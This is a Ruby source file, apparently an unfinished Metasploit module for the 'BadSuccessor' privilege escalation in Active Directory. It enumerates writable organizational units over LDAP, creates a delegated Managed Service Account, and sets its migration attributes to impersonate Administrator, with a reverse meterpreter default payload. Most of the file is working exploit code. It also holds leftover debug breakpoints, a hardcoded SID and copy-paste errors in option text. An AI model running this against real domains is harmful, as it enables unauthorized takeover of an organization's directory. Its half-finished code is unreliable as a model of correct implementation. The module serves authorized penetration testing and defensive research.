##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'pry-byebug'

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::LDAP
  include Rex::Proto::LDAP
  include Msf::OptionalSession::LDAP
  include Msf::Exploit::Remote::LDAP::ActiveDirectory
  #include Msf::Exploit::Remote::CheckModule

  # LDAP_SERVER_SD_FLAGS constant definition, taken from https://ldapwiki.com/wiki/LDAP_SERVER_SD_FLAGS_OID
  LDAP_SERVER_SD_FLAGS_OID = '1.2.840.113556.1.4.801'.freeze
  OWNER_SECURITY_INFORMATION = 0x1
  GROUP_SECURITY_INFORMATION = 0x2
  DACL_SECURITY_INFORMATION = 0x4
  SACL_SECURITY_INFORMATION = 0x8

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BadSuccessor: dMSA abuse to Escalate Privileges in Windows Active Directory',
        'Description' => %q{
          BadSuccessor is a local privilege escalation vulnerability that allows an attacker to abuse the dMSA
          (Managed Service Account) feature in Active Directory.

          Warning: this is #bad
        },
        'Author' => [
          'AngelBoy', # discovery
          'Spencer McIntyre',   # Help with the Kerberos Bits
          'jheysel-r7'  # module
        ],
        'References' => [
          [ 'URL', 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?&vid=badsuccessor-demo-video'],
          [ 'URL', 'https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/'],
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Privileged' => true,
        'Arch' => [ ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [
          ['Windows x64', { 'Arch' => ARCH_X64 }]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-05-21',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )
    register_options([
                       OptString.new('DMSA_ACCOUNT_NAME', [true, 'The name of the dMSA account to be created']),
                       OptString.new('ACCOUNT_TO_IMPERSONATE', [true, 'The name of the dMSA account to be created', 'Administrator']),
                       OptString.new('DC_FQDM', [true, 'The fqdn of the domain controller, to be used in determining if the DC is vulnerable']),
                     ])
  end

  #TODO check method?
  def windows_version_vulnerable?
    #TODO - should we just resolve the domain name of the RHOST value
    fqdn = datastore['DC_FQDM']
    filter = "(objectClass=domain)"
    attributes = ['msds-behavior-version']
    dc_functional_level =  @ldap.search(base: @base_dn, filter: filter, attributes: attributes)

    raise Net::LDAP::Error "Unable to retrieve Windows version information for #{fqdn}" if dc_functional_level.blank?

    dc_functional_level = dc_functional_level.first
    version = dc_functional_level["msds-behavior-version"].first

    unless version.to_i == 10
      print_error("This module only works against domains running at the Windows 2025 functional level.")
      return false
    end
    print_good("The domain is running at the Windows 2025 functional level, which is vulnerable to BadSuccessor.")
    true
  end

  def check
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      begin
        return Exploit::CheckCode::Safe unless windows_version_vulnerable?
      rescue Net::LDAP::Error => e
        return Exploit::CheckCode::Unknown(e.message)
      end

      ous = get_ous_we_can_write_to
      if ous.blank?
        return Exploit::CheckCode::Safe("Failed to find any Organizational Units #{datastore['LDAPUsername']} can write to.")
      end

      print_good("Found #{ous.length} OUs we can write to, listing below:")
      ous.each do |ou|
        print_good(" - #{ou}")
      end

      Exploit::CheckCode::Vulnerable
    end
  end

  def get_ous_we_can_write_to
    organizational_units = []

    filter = '(objectClass=organizationalUnit)'
    attributes = ['distinguishedName', 'name', 'objectClass', 'nTSecurityDescriptor']
    entries = query_ldap_server(filter, attributes)
    entries.each do |entry|

      if adds_obj_grants_permissions?(@ldap, entry, SecurityDescriptorMatcher::Allow.any(%i[WP]))
        organizational_units << entry[:dn].first
      end
    end
    organizational_units
  end

  def query_ldap_server(raw_filter, attributes, base_prefix: nil)
    if base_prefix.blank?
      full_base_dn = @base_dn.to_s
    else
      full_base_dn = "#{base_prefix},#{@base_dn}"
    end
    begin
      filter = Net::LDAP::Filter.construct(raw_filter)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Could not compile the filter! Error was #{e}")
    end

    # Set the value of LDAP_SERVER_SD_FLAGS_OID flag so everything but
    # the SACL flag is set, as we need administrative privileges to retrieve
    # the SACL from the ntSecurityDescriptor attribute on Windows AD LDAP servers.

    all_but_sacl_flag = OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION
    control_values = [all_but_sacl_flag].map(&:to_ber).to_ber_sequence.to_s.to_ber
    controls = []
    controls << [LDAP_SERVER_SD_FLAGS_OID.to_ber, true.to_ber, control_values].to_ber_sequence
    returned_entries = @ldap.search(base: full_base_dn, filter: filter, attributes: attributes, controls: controls)
    query_result_table = @ldap.get_operation_result.table
    validate_query_result!(query_result_table, filter)
    returned_entries
  end

  def create_dmsa(account_name, writeable_dn)
    sam_account_name = account_name + '$' unless account_name.ends_with?('$')
    dn  = "CN=#{account_name},#{writeable_dn}"
    print_status("Attempting to create dmsa account cn: #{account_name}, dn: #{dn}")

    dmsa_attributes = {
      'objectclass' => ["top", "person", "organizationalPerson", "user", "computer", "msDS-DelegatedManagedServiceAccount"],
      'cn' => [account_name],
      'useraccountcontrol' => ["4096"],
      'samaccountname' => [sam_account_name],
      'dnshostname' => ["dontcare.com"],
      'msds-supportedencryptiontypes' => ["28"],
      'msds-managedpasswordinterval' => ["30"],
      'msds-delegatedmsastate' => ["0"],
      'name' => [account_name]
    }

    unless @ldap.add(dn: dn, attributes: dmsa_attributes)

      res = @ldap.get_operation_result

      case res.code
      when Net::LDAP::ResultCodeInsufficientAccessRights
        print_error("Insufficient access to create dMSA seed")
      when Net::LDAP::ResultCodeEntryAlreadyExists
        print_error("Seed object #{account_name} already exists")
      when Net::LDAP::ResultCodeConstraintViolation
        print_error("Constraint violation: #{res.error_message}")
      else
        print_error("#{res.message}: #{res.error_message}")
      end

      return false
    end

    print_good("Created dmsa #{account_name}")
    true

  end

  def ms_security_descriptor_control(flags)
    control_values = [flags].map(&:to_ber).to_ber_sequence.to_s.to_ber
    [LDAP_SERVER_SD_FLAGS_OID.to_ber, control_values].to_ber_sequence
  end

  def build_ace(sid)
    Rex::Proto::MsDtyp::MsDtypAce.new({
                                        header: {
                                          ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
                                        },
                                        body: {
                                          access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,
                                          sid: sid
                                        }
                                      })
  end

  #TODO finish this method
  def grant_write_all_properties(dmsa_dn, user_sid)
    print_status("Granting 'Write all properties' permission for dMSA object: #{dmsa_dn}")

    # Retrieve the current security descriptor
    attributes = ['nTSecurityDescriptor']
    entry = @ldap.search(base: dmsa_dn, attributes: attributes, controls: [ms_security_descriptor_control(DACL_SECURITY_INFORMATION)])&.first
    unless entry
      fail_with(Failure::NotFound, "Failed to retrieve security descriptor for #{dmsa_dn}")
    end

    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(entry['nTSecurityDescriptor'].first)
    unless security_descriptor.dacl
      fail_with(Failure::BadConfig, "No DACL found on the security descriptor for #{dmsa_dn}")
    end

    # Add ACE for "Write all properties"
    ace = Rex::Proto::MsDtyp::MsDtypAce.new({
      header: {
        ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
      },
      body: {
        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask.new({ protocol: 0x20 }), # Write all properties
        sid: Rex::Proto::MsDtyp::MsDtypSid.new(user_sid)
      }
    })

    your_sid = "S-1-5-21-549140833-564715882-1385822508-1103"
    puts "Effective ACEs with WRITE_DAC for #{your_sid}:"

    security_descriptor.dacl.aces.each do |ace|
        require 'pry-byebug'; binding.pry if ace.body.sid == your_sid && (ace[:protocol] & 0x10 != 0)
    end

    security_descriptor.dacl[:aces] << ace
    print_status("Added ACE for 'Write all properties' with access mask 0x20")

    # Update the security descriptor on the LDAP server
    unless @ldap.modify(dn: dmsa_dn, operations: [[:replace, 'nTSecurityDescriptor', security_descriptor.to_s]])
      fail_with(Failure::Unknown, "Failed to update security descriptor for #{dmsa_dn}")
    end

    print_good("Successfully granted 'Write all properties' permission for dMSA object: #{dmsa_dn}")
  end

  def set_dmsa_attributes(dn, delegated_state, preceded_by_link)
    print_status("Setting attributes for dMSA object: #{dn}")

    # Define the attributes to update
    operations = [
      [:replace, 'msds-delegatedmsastate', [delegated_state]],
      [:replace, 'msds-managedaccountprecededbylink', [preceded_by_link]]
    ]

    # Perform the LDAP modify operation
    unless @ldap.modify(dn: dn, operations: operations)
      res = @ldap.get_operation_result
      fail_with(Failure::Unknown, "Failed to update attributes for #{dn}: #{res.message} - #{res.error_message}")
    end

    print_good("Successfully updated attributes for dMSA object: #{dn}")
  end

  def query_account(account_name, writeable_dn)
    filter = Net::LDAP::Filter.eq("cn", account_name)
    entry = nil
    @ldap.search(base: writeable_dn, filter: filter) do |e|
      entry = e
    end

    if entry.nil?
      print_error("Original object not found")
      exit
    end

    attrs_to_copy = {}
    entry.each do |attr, values|
      next unless %w[msds-managedaccountprecededbylink msds-delegatedmsastate].include?(attr.to_s)
      attrs_to_copy[attr.to_s] = values.map(&:to_s)
    end

    attrs_to_copy.each do |key, value|
      if value.is_a?(Array)
        print_status("#{key} => [#{value.map { |v| v.inspect }.join(', ')}]")
      else
        print_status("#{key} => #{value.inspect}")
      end
    end
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          fail_with(Failure::NotFound, "Couldn't discover base DN!")
        end
      end

      @ldap = ldap

      # Get vulnerable OUs
      ous = get_ous_we_can_write_to
      print_good("Found #{ous.length} OUs we can write to, listing them below:")
      ous.each do |ou|
        print_good(" - #{ou}")
      end

      writeable_dn = ous.first
      fail_with(Failure::NoTarget, "There are no Organization Units we can write to, the exploit can not continue") if ous.empty?
      print_good("Found #{ous.length} OUs we can write to")
      create_dmsa(datastore['DMSA_ACCOUNT_NAME'], writeable_dn)

      sam_account_name = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
      user_raw_filter = "(sAMAccountName=#{sam_account_name})"
      attributes = ['DN', 'objectSID', 'objectClass', 'primarygroupID']
      our_account = ldap.search(base: @base_dn, filter: user_raw_filter, attributes: attributes)&.first
      #TODO I already have FullControl over this dMSA - this might not always be the case
      #TODO It's possible you'll only end up with Owner (and in turn WriteDacl) which will require the module to edit the Dacl so we can then set the dmsa attributes to complete the dMSA account migration to impersonate the higher privileged account
      #grant_write_all_properties("CN=#{datastore['DMSA_ACCOUNT_NAME']},#{writeable_dn}", Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first))
      set_dmsa_attributes("CN=#{datastore['DMSA_ACCOUNT_NAME']},#{writeable_dn}","2", "CN=#{datastore['ACCOUNT_TO_IMPERSONATE']},CN=Users,DC=msf,DC=local")
      query_account(datastore['DMSA_ACCOUNT_NAME'], writeable_dn)
    end
  end
end